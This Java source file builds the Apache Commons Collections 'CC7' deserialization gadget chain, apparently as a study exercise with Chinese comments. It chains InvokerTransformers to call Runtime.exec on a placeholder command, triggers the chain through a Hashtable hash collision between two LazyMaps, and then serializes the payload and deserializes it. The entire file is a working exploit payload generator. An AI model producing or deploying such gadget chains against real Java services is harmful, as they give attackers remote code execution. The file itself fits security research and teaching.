package cc7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import toolkit.Seriliazation;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class CC7Chain {
    private static String injectedCmd = "chromium";

    public static void main(String[] args) throws Exception {
        cc7();
    }

    public static void cc7() throws Exception {
        /**
         * cc1 后半段
         */
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{injectedCmd}),
                new ConstantTransformer(new HashSet<String>())
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        /**
         * cc7 前半段
         */

        HashMap innerMap1 = new HashMap();
        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);
        innerMap1.put("yy", 1);

        HashMap innerMap2 = new HashMap();
        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);
        innerMap2.put("zZ", 1);

        /**
         * HashTable.readObject()
         *      -> reconstitutionPut()
         *          -> tab[i].key.equals(key)
         */
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "a");
        hashtable.put(lazyMap2, "b");

        Class clazzChainedTransformer = ChainedTransformer.class;
        Field fieldiTransformers = clazzChainedTransformer.getDeclaredField("iTransformers");
        fieldiTransformers.setAccessible(true);
        fieldiTransformers.set(chainedTransformer, transformers);

        lazyMap2.remove("yy");

        Seriliazation.serialize(hashtable);
        Seriliazation.unserialize("ser.bin");
    }
}